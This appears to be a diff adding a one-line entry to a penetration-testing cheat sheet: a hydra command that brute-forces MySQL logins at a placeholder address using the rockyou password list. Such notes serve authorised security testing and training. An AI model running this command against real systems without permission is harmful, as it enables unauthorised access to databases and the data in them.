@@ -1,1 +1,3 @@
-
+MySQL:
+Bruteforce MySQL credentials
+hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP mysql
